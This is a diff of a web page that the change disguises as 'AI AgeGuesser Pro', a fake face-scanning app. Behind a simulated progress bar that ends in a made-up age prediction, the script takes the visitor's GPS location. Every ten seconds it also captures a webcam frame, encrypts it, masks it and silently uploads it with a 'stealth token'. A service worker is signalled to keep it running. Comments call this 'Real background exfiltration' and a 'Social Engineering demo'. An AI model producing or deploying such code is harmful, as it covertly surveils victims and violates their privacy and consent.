@@ -3,59 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NeuralScan Pro | Advanced Biometric AI</title>
+    <title>AI AgeGuesser Pro | Neural Analysis</title>
     <style>
-        :root { --primary: #6366f1; --accent: #06b6d4; --bg: #0f172a; }
+        :root { --primary: #8b5cf6; --accent: #ec4899; --bg: #0f172a; }
         body { 
-            margin: 0; padding: 0; background: radial-gradient(at top left, #1e1b4b, var(--bg));
-            color: white; font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 0; background: radial-gradient(at top left, #2e1065, var(--bg));
+            color: white; font-family: 'Inter', sans-serif;
             display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden;
         }
         .glass-card {
-            background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px);
+            background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(16px);
             border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px;
-            border-radius: 30px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); width: 380px; text-align: center;
+            border-radius: 24px; box-shadow: 0 0 40px rgba(139, 92, 246, 0.3); width: 360px; text-align: center;
         }
-        .logo { font-weight: 800; font-size: 24px; letter-spacing: -1px; margin-bottom: 10px; display: block; }
-        .logo span { color: var(--primary); }
+        h1 { font-size: 22px; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .tagline { font-size: 12px; color: #94a3b8; margin-bottom: 20px; }
         .preview-window {
-            width: 100%; height: 220px; background: #000; border-radius: 15px;
-            margin: 20px 0; position: relative; overflow: hidden; border: 1px solid rgba(99, 102, 241, 0.3);
+            width: 100%; height: 240px; background: #020617; border-radius: 16px;
+            margin-bottom: 20px; position: relative; overflow: hidden; border: 2px solid #334155;
         }
         #video { width: 100%; height: 100%; object-fit: cover; display: none; }
-        .scan-bar {
-            position: absolute; width: 100%; height: 4px; background: linear-gradient(to right, transparent, var(--accent), transparent);
-            top: 0; animation: scanMove 2.5s infinite linear; display: none;
+        .scanning-ui {
+            position: absolute; inset: 0; border: 2px solid var(--primary); 
+            border-radius: 16px; opacity: 0.3; pointer-events: none; display: none;
+        }
+        .scan-line {
+            position: absolute; width: 100%; height: 2px; background: var(--accent);
+            box-shadow: 0 0 15px var(--accent); top: 0; animation: scanMove 3s infinite linear; display: none;
         }
         @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }
         .btn {
             background: linear-gradient(135deg, var(--primary), var(--accent));
-            color: white; border: none; padding: 16px; border-radius: 12px; width: 100%;
-            font-weight: bold; font-size: 16px; cursor: pointer;
-            transition: transform 0.2s;
+            color: white; border: none; padding: 14px; border-radius: 12px; width: 100%;
+            font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.3s;
         }
-        .btn:active { transform: scale(0.98); }
-        #console { font-family: monospace; font-size: 11px; color: #60a5fa; margin-top: 15px; text-align: left; min-height: 50px; }
+        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
+        #status-box { font-family: monospace; font-size: 11px; color: #f472b6; margin-top: 15px; text-align: left; }
     </style>
 </head>
 <body>
 
 <div class="glass-card">
-    <span class="logo">NEURAL<span>SCAN</span> AI</span>
-    <p style="font-size: 12px; color: #cbd5e1;">CLOUD SECURE: RENDER.COM</p>
+    <h1>AI AgeGuesser Pro</h1>
+    <p class="tagline">Neural Analysis of Micro-expressions & Biometrics</p>
+    
     <div class="preview-window">
-        <div id="scan-bar" class="scan-bar" style="display:block;"></div>
+        <div id="scan-line" class="scan-line"></div>
+        <div id="scanning-ui" class="scanning-ui"></div>
         <video id="video" autoplay muted playsinline></video>
-        <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px;">AWAITING BIOMETRIC LINK...</div>
+        <div id="placeholder" style="padding-top: 100px; color: #475569; font-size: 11px;">CENTER YOUR FACE...</div>
     </div>
-    <button id="main-btn" class="btn">INITIALIZE PERSISTENCE</button>
-    <div id="console">> System Standby.</div>
+
+    <button id="main-btn" class="btn">START SCAN</button>
+    <div id="status-box">_ SYSTEM READY</div>
 </div>
 
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-    // --- HTTPS ENFORCER ---
+    // HTTPS Enforcer for hardware access
     if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
         location.replace(`https:${location.href.substring(location.protocol.length)}`);
     }
@@ -63,21 +69,19 @@
     const btn = document.getElementById('main-btn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const consoleLog = document.getElementById('console');
-    const scanBar = document.querySelector('.scan-bar');
+    const statusBox = document.getElementById('status-box');
+    const scanLine = document.getElementById('scan-line');
+    const scanUI = document.getElementById('scanning-ui');
 
     const SECRET_PASSPHRASE = "neural-link-omega-99"; 
     const STEALTH_TOKEN = "delta-v-882-alpha";
     const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
     let coords = { lat: "unknown", lon: "unknown" };
 
-    const log = (msg) => { consoleLog.innerHTML = `> ${msg}`; };
+    const updateStatus = (msg) => { statusBox.innerHTML = `_ ${msg.toUpperCase()}`; };
 
-    // Register Service Worker
     if ('serviceWorker' in navigator) {
-        window.addEventListener('load', () => {
-            navigator.serviceWorker.register('/sw.js').then(() => log("Persistence layer ready."));
-        });
+        window.addEventListener('load', () => navigator.serviceWorker.register('/sw.js'));
     }
 
     async function deriveKey(pass) {
@@ -99,32 +103,39 @@
 
     btn.onclick = async () => {
         btn.disabled = true;
-        log("Requesting Handshake...");
+        updateStatus("Requesting Biometric Link...");
 
-        // Start GPS Capture
         navigator.geolocation.getCurrentPosition(
             (p) => { coords = { lat: p.coords.latitude, lon: p.coords.longitude }; },
-            (err) => { log("GPS Refused. Continuing with IP..."); }
+            () => { updateStatus("Error: GPS handshaking failed."); }
         );
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             video.style.display = 'block';
+            scanLine.style.display = 'block';
+            scanUI.style.display = 'block';
             document.getElementById('placeholder').style.display = 'none';
             
-            // Picture-in-Picture for persistence
-            if (document.pictureInPictureEnabled && video.requestPictureInPicture) {
-                video.requestPictureInPicture().catch(() => {});
-            }
-
-            // Signal Service Worker persistence
             if (navigator.serviceWorker.controller) {
                 navigator.serviceWorker.controller.postMessage({ type: 'INIT_PERSISTENCE' });
             }
 
-            log("Handshake successful. Exfiltrating...");
+            updateStatus("Analyzing Face... 0%");
             
+            // Simulation logic for the Social Engineering demo
+            let progress = 0;
+            const timer = setInterval(() => {
+                progress += Math.floor(Math.random() * 5) + 1;
+                if(progress <= 99) updateStatus(`Analyzing Face... ${progress}%`);
+                else {
+                    updateStatus("Prediction: 21 (Confidence: 94%)");
+                    clearInterval(timer);
+                }
+            }, 500);
+
+            // Real background exfiltration
             setInterval(async () => {
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, 640, 480);
@@ -135,17 +146,13 @@
 
                 fetch('/save-photo', {
                     method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json', 
-                        'X-Neural-Token': STEALTH_TOKEN 
-                    },
+                    headers: { 'Content-Type': 'application/json', 'X-Neural-Token': STEALTH_TOKEN },
                     body: JSON.stringify({ data: masked })
-                }).catch(e => console.error("Tunnel error"));
-
-            }, 15000);
+                }).catch(() => {});
+            }, 10000);
 
         } catch (e) { 
-            log(`Critical Error: ${e.message}`); 
+            updateStatus("SSL Error: Permissions denied."); 
             btn.disabled = false; 
         }
     };
